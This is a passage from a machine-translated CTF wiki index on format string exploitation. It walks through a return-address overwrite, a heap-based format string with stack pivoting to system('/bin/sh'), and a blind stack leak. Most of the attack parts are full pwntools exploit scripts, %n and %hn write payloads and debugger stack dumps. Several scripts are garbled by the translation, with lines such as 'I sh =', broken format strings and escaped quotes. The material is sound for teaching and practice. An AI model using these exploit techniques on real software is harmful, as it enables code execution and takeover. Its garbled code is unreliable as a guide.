v6 = read(0, (char *)&amp;a4 + 4, 0x14uLL);\n</code></pre> <p>Of course, we can also find that the username we read in is 20 bytes from the password.</p> <pre><code>  puts(\"Input your username(max lenth:20): \");\n\n  fflush(stdout);\n\n  v8 = read(0, &amp;bufa, 0x14uLL);\n\n  if ( v8 &amp;&amp; v8 &lt;= 0x14u )\n\n  {\n\n    puts(\"Input your password(max lenth:20): \");\n\n    fflush(stdout);\n\n    v6 = read(0, (char *)&amp;a4 + 4, 0x14uLL);\n\n    fflush(stdout);\n\n*(_QWORD *)buf = bufa;\n* (_ QWORD *) (buf + 8) = a3;\n    *(_QWORD *)(buf + 16) = a4;\n</code></pre> <p>Ok, this is almost the same. In addition, you can also find that this account password is not paired and not paired.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-ideas","title":"Using ideas","text":"<p>Our ultimate goal is to get the system's shell. We can find that in the given file, there is a function that directly calls system('bin/sh') at the address 0x00000000004008A6 (about this discovery, generally the program is now roughly take a look.). Then if we modify the return address of a function to this address, it is equivalent to getting the shell.</p> <p>Although the memory that stores the return address itself is dynamically changing, its address relative to rbp does not change, so we can use the relative address to calculate. Use ideas as follows</p> <ul> <li>Determine the offset</li> <li>Get the rbp and return address of the function</li> <li>Get the address where the return address is stored based on the relative offset</li> <li>Write the address of the execution system function call to the address where the return address is stored.</li> </ul>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-the-offset_1","title":"Determining the offset","text":"<p>First, let's first determine the offset. Enter the user name aaaaaaaa, enter the password casually, at the printf(&amp;a4 + 4) function that outputs the password under the breakpoint.</p> <pre><code>Register Account first!\n\nInput your username(max lenth:20): \n\naaaaaaaa\n\nInput your password(max lenth:20): \n\n%p%p%p%p%p%p%p%p%p%p\n\nRegister Success!!\n\n1.Sh0w Account Infomation!\n\n2.Ed1t Account Inf0mation!\n\n3.QUit sangebaimao:(\n\n&gt;error options\n\n1.Sh0w Account Infomation!\n\n2.Ed1t Account Inf0mation!\n\n3.QUit sangebaimao:(\n\n&gt;1\n\n...\n</code></pre> <p>At this point the stack is</p> <pre><code>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n\n     0x400b1a                  call   0x400758\n\n0x400b1fe rdi, [rbp + 0x10]\n     0x400b23                  mov    eax, 0x0\n\n \u2192   0x400b28                  call   0x400770\n\n   \u21b3    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0\n\n0x400776 xchg ax, ax\n        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8\n\n0x40077e xchg ax, ax\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n\n0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192  0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n\n0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\"     \u2190 $rdi\n\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n\n0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\"\n\n0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\"\n\n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2\n</code></pre> <p>We can find that the user name we entered is in the third position on the stack, then the position of the format string itself is removed, and the offset is 5 + 3 = 8.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#change-address","title":"Change address","text":"<p>We will carefully observe the information of the stack at the breakpoint.</p> <pre><code>0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192  0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n\n0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\"     \u2190 $rdi\n\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n\n0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\"\n\n0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\"\n\n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2\n</code></pre> <p>You can see that the second location on the stack stores the return address of the function (in fact, the value stored in the push rip when the show account function is called), and the offset in the format string is 7.</p> <p>At the same time, on the stack, the first element stores the rbp of the previous function. So we can get the offset 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38. Then if we know the value of rbp, we know the address of the function return address.</p> <p>0x0000000000400d74 is different from 0x00000000004008A6 with only 2 bytes lower, so we can only modify 2 bytes starting at 0x00007fffffffdb48.</p> <p>It should be noted here that on some newer systems (such as ubuntu 18.04), the program crash may occur when the return address is directly modified to 0x00000000004008A6. In this case, you can consider modifying the return address to 0x00000000004008AA, that is, directly calling system(\"/bin /sh\")</p> <pre><code>.text:00000000004008A6 sub_4008A6      proc near\n\n.text:00000000004008A6 ; __unwind {\n\n.text:00000000004008A6                 push    rbp\n\n.text:00000000004008A7                 mov     rbp, rsp\n\n.text:00000000004008AA &lt;- here         mov     edi, offset command ; \"/bin/sh\"\n\n.text:00000000004008AF                 call    system\n\n.text:00000000004008B4                 pop     rdi\n\n.text:00000000004008B5                 pop     rsi\n\n.text:00000000004008B6                 pop     rdx\n\n.text: 00000000004008B7 retn\n</code></pre>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-the-program_1","title":"Using the program","text":"<pre><code>from pwn import *\n\ncontext.log_level=\"debug\"\n\ncontext.arch=\"amd64\"\n\n\n\nsh=process(\"./pwnme_k0\")\n\nbinary=ELF(\"pwnme_k0\")\n\n#gdb.attach(sh)\n\n\n\nsh.recv()\n\nsh.writeline(\"1\"*8)\n\nsh.recv()\n\nsh.writeline(\"%6$p\")\n\nsh.recv()\n\nsh.writeline(\"1\")\n\nsh.recvuntil(\"0x\")\n\nret_addr = int(sh.recvline().strip(),16) - 0x38\n\nSuccess ( &amp;quot;ret_addr:&amp;quot; + Hex (ret_addr))\n\n\n\n\nsh.recv()\n\nsh.writeline(\"2\")\n\nsh.recv()\n\nsh.sendline (p64 (ret_addr))\nsh.recv()\n\n#sh.writeline(\"%2214d%8$hn\")\n\n#0x4008aa-0x4008a6\n\nsh.writeline(\"%2218d%8$hn\")\n\n\n\nsh.recv()\n\nsh.writeline(\"1\")\n\nsh.recv()\n\nsh.interactive()\n</code></pre>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#formatted-string-vulnerability-on-heap","title":"Formatted string vulnerability on heap","text":""},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle_3","title":"Principle","text":"<p>The so-called formatted string on the heap means that the formatted string itself is stored on the heap. This mainly increases the difficulty of getting the corresponding offset. In general, the formatted string is likely to be copied. On the stack.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#examples_3","title":"Examples","text":"<p>Here we take [contacts] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts) in CSAW 2015 as an example.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-protection_3","title":"Determining protection","text":"<pre><code>\u279c  2015-CSAW-contacts git:(master) \u2717 checksec contacts\n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>It can be seen that the program not only turns on NX protection but also turns on Canary.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#_4","title":"\u5206\u6790\u7a0b\u5e8f","text":"<p>A simple look at the program, found that the program, as the name describes, is a contact-related program that can create, modify, delete, and print contact information. And after reading it carefully, you can find a format string vulnerability when printing contact information.</p> <pre><code>int __cdecl PrintInfo(int a1, int a2, int a3, char *format)\n\n{\n\n  printf(\"\\tName: %s\\n\", a1);\n\n  printf(\"\\tLength %u\\n\", a2);\n  printf(\"\\tPhone #: %s\\n\", a3);\n\n  printf(\"\\tDescription: \");\n\n  return printf(format);\n\n}\n</code></pre> <p>Take a closer look and you can see that this format actually points to the heap.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-ideas_1","title":"Using ideas","text":"<p>Our basic purpose is to get the system's shell and get the flag. In fact, since there is a format string vulnerability, we should be able to control the program flow by hijacking the got table or controlling the return address of the program. But it is not very feasible here. The reasons are as follows</p> <ul> <li>The reason why we can't hijack got to control the program flow is because we found that only the printf function that can be output to our given string is common in the program. We only have to select it to construct /bin/sh to execute it. ('/bin/sh'), but the printf function is also used elsewhere, which will cause the program to crash directly.</li> <li>Secondly, it is not possible to directly control the program return address to control the program flow because we do not have a directly executable address to store our contents, and use the format string to write directly to the stack system__addr + 'bbbb ' + addr of '/bin/sh' doesn't seem to be realistic.</li> </ul> <p>So what can we do? We also have the skills to talk about stack overflow before, stack pivoting. And here, what we can control happens to be heap memory, so we can move the stack to the heap. Here we use the leave command for stack migration, so before migration we need to modify the program to save the value of ebp to the value we want. Only then will esp become the value we want when we execute the leave instruction. At the same time, because we are using the format string to modify, so we have to know the address of the ebp store, and the address of the ebp stored in the PrintInfo function changes every time, and we can not know by other means. . However, the ebp value pushed into the stack in the program actually saves the address of the ebp value of the previous function, so we can modify the value of the saved ebp of the upper layer function, ie the upper upper layer function ( That is, the main function) ebp value. In this way, when the upper program returns, the operation of migrating the stack to the heap is implemented.</p> <p>The basic idea is as follows</p> <ul> <li>First get the address of the system function</li> <li>Determine by libc database by leaking the address of a libc function.</li> <li>Construct a basic contact description as system_addr + 'bbbb' + binsh_addr</li> <li>Modify the ebp saved by the upper function (ie the ebp of the upper layer function) to the address -** of the storage system_addr.</li> <li>When the main program returns, the following operations will occur</li> <li>move esp, ebp, point esp to the address of system_addr -4</li> <li>pop ebp, point esp to system_addr</li> <li>ret, get the shell by pointing eip to system_addr.</li> </ul>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#get-the-relevant-address-and-offset","title":"Get the relevant address and offset","text":"<p>Here we mainly get the system function address, /bin/sh address, the address of the contact description stored on the stack, and the address of the PrintInfo function.</p> <p>First, we get the system function address and /bin/sh address according to the libc_start_main_ret address stored on the stack (which is the function that will run when the main function returns). We construct the corresponding contact, then choose to output the contact information, and breakpoints at printf, and run until the printf function of the format string vulnerability, as follows</p> <pre><code> \u2192 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;\n\n   \u21b3  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]\n\n      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret    \n\n      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]\n\n      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret    \n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n\n['0xffffccfc', 'l8']\n\n8\n\n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190 $esp\n\n0xffffcd00\u2502+0x04: 0x0804c420  \u2192  \"1234567\"\n\n0xffffcd04\u2502+0x08: 0x0804c410  \u2192  \"11111\"\n\n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192  &lt;puts+11&gt; add ebx, 0x152355\n\n0xffffcd0c\u2502+0x10: 0x00000000\n\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190 $ebp\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500\n\n[#0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\")\n\n[#1] 0x8048c27 \u2192 leave \n\n[#2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1\n\n[# 3] 0x80487a2 \u2192 jmp 0x80487b3\n[#4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 &lt;_dl_fini&gt;, stack_end=0xffffce0c)\n\n[# 5] 0x80485e1 \u2192 holds\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\ngef\u27a4  dereference $esp 140\n\n['$esp', '140']\n\n1\n\n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190 $esp\n\ngef\u27a4  dereference $esp l140\n\n['$esp', 'l140']\n\n140\n\n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190 $esp\n\n0xffffcd00\u2502+0x04: 0x0804c420  \u2192  \"1234567\"\n\n0xffffcd04\u2502+0x08: 0x0804c410  \u2192  \"11111\"\n\n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192  &lt;puts+11&gt; add ebx, 0x152355\n\n0xffffcd0c\u2502+0x10: 0x00000000\n\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190 $ebp\n\n0xffffcd1c\u2502+0x20: 0x08048c99  \u2192   add DWORD PTR [ebp-0xc], 0x1\n\n0xffffcd20\u2502+0x24: 0x0804b0a8  \u2192  \"11111\"\n\n0xffffcd24\u2502+0x28: 0x00002b67 (\"g+\"?)\n\n0xffffcd28\u2502+0x2c: 0x0804c410  \u2192  \"11111\"\n\n0xffffcd2c\u2502+0x30: 0x0804c420  \u2192  \"1234567\"\n\n0xffffcd30\u2502+0x34: 0xf7fadd60  \u2192  0xfbad2887\n\n0xffffcd34\u2502+0x38: 0x08048ed6  \u2192  0x25007325 (\"%s\"?)\n\n0xffffcd38\u2502+0x3c: 0x0804b0a0  \u2192  0x0804c420  \u2192  \"1234567\"\n\n0xffffcd3c\u2502+0x40: 0x00000000\n\n0xffffcd40\u2502+0x44: 0xf7fad000  \u2192  0x001b1db0\n\n0xffffcd44\u2502+0x48: 0x00000000\n\n0xffffcd48\u2502+0x4c: 0xffffcd78  \u2192  0x00000000\n\n0xffffcd4c\u2502 + 0x50: 0x080487a2 \u2192 jmp 0x80487b3\n0xffffcd50\u2502+0x54: 0x0804b0a0  \u2192  0x0804c420  \u2192  \"1234567\"\n\n0xffffcd54\u2502+0x58: 0xffffcd68  \u2192  0x00000004\n\n0xffffcd58\u2502+0x5c: 0x00000050 (\"P\"?)\n\n0xffffcd5c\u2502+0x60: 0x00000000\n\n0xffffcd60\u2502+0x64: 0xf7fad3dc  \u2192  0xf7fae1e0  \u2192  0x00000000\n\n0xffffcd64\u2502+0x68: 0x08048288  \u2192  0x00000082\n\n0xffffcd68\u2502+0x6c: 0x00000004\n\n0xffffcd6c\u2502+0x70: 0x0000000a\n\n0xffffcd70\u2502+0x74: 0xf7fad000  \u2192  0x001b1db0\n\n0xffffcd74\u2502+0x78: 0xf7fad000  \u2192  0x001b1db0\n\n0xffffcd78\u2502+0x7c: 0x00000000\n\n0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192  &lt;__libc_start_main+247&gt; add esp, 0x10\n\n0xffffcd80\u2502+0x84: 0x00000001\n\n0xffffcd84\u2502+0x88: 0xffffce14  \u2192  0xffffd00d  \u2192  \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\"\n\n0xffffcd88\u2502+0x8c: 0xffffce1c  \u2192  0xffffd058  \u2192  \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\"\n</code></pre> <p>We can get it by simple judgment.</p> <pre><code>0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192  &lt;__libc_start_main+247&gt; add esp, 0x10\n</code></pre> <p>Stored is the return address of __libc_start_main, and uses fmtarg to get the corresponding offset. It can be seen that the offset is 32, then the offset from the format string is 31.</p> <pre><code>gef\u27a4  fmtarg 0xffffcd7c\n\nThe index of format argument : 32\n</code></pre> <p>This way we can get the corresponding address. In turn, you can get the corresponding libc according to libc-database, and then get the system function address and /bin/sh function address.</p> <p>Second, we can determine that the address 0xffffcd2c of the formatted string stored on the stack is 11 relative to the format string, which is used to construct our contacts.</p> <p>Furthermore, we can see that the following address holds the call address of the upper function, and its offset from the format string is 6, so that we can directly modify the value of ebp stored in the upper function.</p> <pre><code>0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190 $ebp\n</code></pre>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#constructing-a-contact-to-get-the-heap-address","title":"Constructing a contact to get the heap address","text":"<p>After learning the above information, we can use the following method to get the heap address and the corresponding ebp address.</p> <pre><code>[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]\n</code></pre> <p>To get the corresponding corresponding address. The latter bbbb is for the convenience of accepting strings.</p> <p>Here, because the stack space requested by the function is the same as the free space, the ebp address we get will not change because we call it again.</p> <p>In some environments, the system address will appear \\x00, causing 0 truncation when printf will result in the inability to disclose both addresses, so you can modify the payload as follows:</p> <pre><code>[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]\n</code></pre> <p>If the payload is modified to do this, you need to add a 12 offset to the heap. This ensures that the 0 truncation occurs after the leak.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#modify-ebp","title":"Modify ebp","text":"<p>Since we need to execute the move command to assign ebp to esp and also need to execute pop ebp to execute the ret instruction, we need to modify ebp to store the value of system address -4. After pop ebp, the esp happens to point to the address of the save system, and the system function can be executed by executing the ret instruction.</p> <p>We have already learned the ebp value we want to modify, and we know that the corresponding offset is 6, so we can construct the following payload to modify the corresponding value.</p> <pre><code>part1 = (heap_addr - 4) / 2\n\npart2 = heap_addr - 4 - part1\n\npayload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'\n</code></pre>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#get-the-shell","title":"Get the shell","text":"<p>At this time, after executing the format string function, exit to the upper function, we enter 5, exit the program will execute the ret instruction, you can get the shell.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-the-program_2","title":"Using the program","text":"<pre><code>from pwn import *\n\nfrom LibcSearcher import *\n\ncontact = ELF('./contacts')\n\n##context.log_level = 'debug'\n\nif args['REMOTE']:\n\n    sh = remote(11, 111)\n\nelse:\n\n    sh = process('./contacts')\n\n\n\n\n\ndef createcontact(name, phone, descrip_len, description):\n\nsh.recvuntil (&amp;#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)\n    sh.sendline('1')\n\n    sh.recvuntil('Contact info: \\n')\n\n    sh.recvuntil('Name: ')\n\n    sh.sendline(name)\n\n    sh.recvuntil('You have 10 numbers\\n')\n\n    sh.sendline(phone)\n\n    sh.recvuntil('Length of description: ')\n\n    sh.sendline(descrip_len)\n\n    sh.recvuntil('description:\\n\\t\\t')\n\n    sh.sendline(description)\n\n\n\n\n\ndef printcontact():\n\nsh.recvuntil (&amp;#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)\n    sh.sendline('4')\n\n    sh.recvuntil('Contacts:')\n\n    sh.recvuntil('Description: ')\n\n\n\n\n\n## get system addr &amp; binsh_addr\n\npayload = &amp;#39;% 31 $ paaaa&amp;#39;\ncreatecontact('1111', '1111', '111', payload)\n\nprint contact ()\nlibc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)\n\nlog.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))\n\nlibc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)\n\nlibc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')\n\nsystem_addr = libc_base + libc.dump('system')\n\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\n\nlog.success('get system addr: ' + hex(system_addr))\n\nlog.success('get binsh addr: ' + hex(binsh_addr))\n\n##gdb.attach(sh)\n\n\n\n## get heap addr and ebp addr\n\npayload = flat([\n\n    system_addr,\n\n&amp;#39;yyyah&amp;#39;,\n    binsh_addr,\n\n    '%6$p%11$pcccc',\n\n])\n\ncreatecontact('2222', '2222', '222', payload)\n\nprint contact ()\nsh.recvuntil('Description: ')\n\ndata = sh.recvuntil('cccc', drop=True)\n\ndata = data.split('0x')\n\nprint data\n\nebp_addr = int(data[1], 16)\n\nheap_addr = int(data[2], 16)\n\n\n\n## modify ebp\n\npart1 = (heap_addr - 4) / 2\n\npart2 = heap_addr - 4 - part1\n\npayload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'\n\n##print payload\n\ncreatecontact('3333', '123456789', '300', payload)\n\nprint contact ()\nsh.recvuntil('Description: ')\n\nsh.recvuntil('Description: ')\n\n##gdb.attach(sh)\n\nprint 'get shell'\n\nsh.recvuntil (&amp;#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)\n##get shell\n\nsh.sendline('5')\n\nsh.interactive()\n</code></pre> <p>In the case of system 0 truncation, exp is as follows: <pre><code>from pwn import *\n\ncontext.log_level=\"debug\"\n\ncontext.arch=\"x86\"\n\n\n\nio=process(\"./contacts\")\n\nbinary=ELF(\"contacts\")\n\nlibc=binary.libc\n\n\ndef createcontact(io, name, phone, descrip_len, description):\n\nI sh =\nsh.recvuntil (&amp;#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)\n    sh.sendline('1')\n\n    sh.recvuntil('Contact info: \\n')\n\n    sh.recvuntil('Name: ')\n\n    sh.sendline(name)\n\n    sh.recvuntil('You have 10 numbers\\n')\n\n    sh.sendline(phone)\n\n    sh.recvuntil('Length of description: ')\n\n    sh.sendline(descrip_len)\n\n    sh.recvuntil('description:\\n\\t\\t')\n\n    sh.sendline(description)\n\ndef printcontact(io):\n\nI sh =\nsh.recvuntil (&amp;#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)\n    sh.sendline('4')\n\n    sh.recvuntil('Contacts:')\n\n    sh.recvuntil('Description: ')\n\n\n\n# Gdb.attach (I)\n\n\ncreatecontact (io, &amp;quot;1&amp;quot;, &amp;quot;1&amp;quot;, &amp;quot;111&amp;quot;, &amp;quot;% 31 $ paaaa&amp;quot;)\nprintcontact (I)\nlibc_start_main = int(io.recvuntil('aaaa', drop=True), 16)-241\n\nlog.success('get libc_start_main addr: ' + hex(libc_start_main))\n\nlibc_base=libc_start_main-libc.symbols[\"__libc_start_main\"]\n\nsystem=libc_base+libc.symbols[\"system\"]\n\nbinsh=libc_base+next(libc.search(\"/bin/sh\"))\n\nlog.success(\"system: \"+hex(system))\n\nlog.success(\"binsh: \"+hex(binsh))\n\n\n\npayload = '%6$p%11$pccc'+p32(system)+'bbbb'+p32(binsh)+\"dddd\"\n\ncreatecontact(io,'2', '2', '111', payload)\n\nprintcontact (I)\nio.recvuntil (&amp;#39;Description:&amp;#39;)\ndata = io.recvuntil('ccc', drop=True)\n\ndata = data.split('0x')\n\nprint data\n\nebp_addr = int(data[1], 16)\n\nheap_addr = int(data[2], 16)+12\n\nlog.success(\"ebp: \"+hex(system))\n\nlog.success(\"heap: \"+hex(heap_addr))\n\n\n\npart1 = (heap_addr - 4) / 2\n\npart2 = heap_addr - 4 - part1\n\npayload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'\n\n\n\n#payload=fmtstr_payload(6,{ebp_addr:heap_addr})\n\n##print payload\n\ncreatecontact(io,'3333', '123456789', '300', payload)\n\nprintcontact (I)\nio.recvuntil (&amp;#39;Description:&amp;#39;)\nio.recvuntil (&amp;#39;Description:&amp;#39;)\n##gdb.attach(sh)\n\nlog.success(\"get shell\")\n\nio.recvuntil (&amp;#39;&amp;gt;&amp;gt;&amp;gt;&amp;#39;)\n##get shell\n\nio.sendline ( &amp;#39;5&amp;#39;)\nio.interactive ()\n</code></pre></p> <p>It should be noted that this does not stabilize the shell because we have entered a string that is too long. But we have no way to control the address we want to enter in the front. It can only be this way.</p> <p>Why do you need to print so much? Because the format string is not on the stack, even if we get the address of the ebp that needs to be changed, there is no way to write this address to the stack, use the $ symbol to locate him; because there is no way to locate, there is no way to use l \\ll and other ways to write this address, so only print a lot.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#format-string-blind-hit","title":"Format string blind hit","text":""},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle_4","title":"Principle","text":"<p>The so-called format string blind typing means that only the interactive ip address and port are given. The corresponding binary file is not given to let us perform pwn. In fact, this is similar to BROP, but BROP uses stack overflow, and here We are using a format string vulnerability. In general, we follow the steps below</p> <ul> <li>Determine the number of bits in the program</li> <li>Identify the location of the vulnerability -Use</li> </ul> <p>Since I didn't find the source code after the game, I simply constructed two questions.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#example-1-leaking-stack","title":"Example 1 - Leaking Stack","text":"<p>Both the source and deployment files are placed in the corresponding folder [fmt_blind_stack] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack).</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determine-the-number-of-programs","title":"Determine the number of programs","text":"<p>We randomly entered %p and the program echoed the following information.</p> <pre><code>\u279c  blind_fmt_stack git:(master) \u2717 nc localhost 9999\n\n%p\n\n0x7ffd4799beb0\n\nG\ufffdflag is on the stack%                          \n</code></pre> <p>Tell us that the flag is on the stack and that the program is 64-bit and that there should be a format string vulnerability.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#use","title":"Use","text":"<p>Then let's take a little test and see</p> <pre><code>from pwn import *\n\ncontext.log_level = 'error'\n\n\n\n\n\ndef leak(payload):\n\n    sh = remote('127.0.0.1', 9999)\n\n    sh.sendline(payload)\n\n    data = sh.recvuntil('\\n', drop=True)\n\n    if data.startswith('0x'):\n\n        print p64(int(data, 16))\n\n    sh.close()\n\n\n\n\n\ni = 1\n\nwhile 1:\n\n    payload = '%{}$p'.format(i)\n\n    leak(payload)\n\n    i += 1\n</code></pre> <p>Finally, I simply looked at the output and got the flag.</p> <pre><code>////////\n\n////////\n\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\nflag 